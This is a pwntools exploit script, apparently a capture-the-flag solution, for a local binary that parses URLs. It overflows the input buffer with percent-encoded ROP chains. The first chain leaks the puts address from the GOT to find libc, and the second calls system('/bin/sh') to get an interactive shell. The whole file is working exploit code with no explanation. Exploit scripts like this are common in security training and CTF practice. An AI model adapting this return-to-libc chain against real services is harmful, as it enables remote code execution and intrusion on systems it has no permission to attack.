from pwn import *
#context.log_level = 'debug'

binary = ELF('./bin')
libc = ELF('libc.so.6')

t = process('./bin')

t.recvuntil('URL: ')

#gdb.attach(t)
rop = ''
rop += p64(0x0000000000400c13)  #pop rdi ; ret
rop += p64(binary.got['puts'])
rop += p64(binary.plt['puts'])
rop += p64(0x0000000000400850)

t.sendline('http://%1\x00' + 'a'*144 + rop.replace('\x00','%00') + 'lo~|')

t.recvline()
puts = t.recvline()[:-1]
puts = u64(puts.ljust(8,'\x00'))
base = puts - libc.symbols['puts']
system = base + libc.symbols['system']
sh = base + libc.search('/bin/sh').next()

rop = ''
rop += p64(0x0000000000400c13)  #pop rdi ; ret
rop += p64(sh)
rop += p64(system)
rop += p64(0x0000000000400850)

t.sendline('http://%1\x00' + 'a'*144 + rop.replace('\x00','%00') + 'lo~|')

t.sendline('echo "explorer"')
t.recvuntil("explorer\n")
t.interactive()

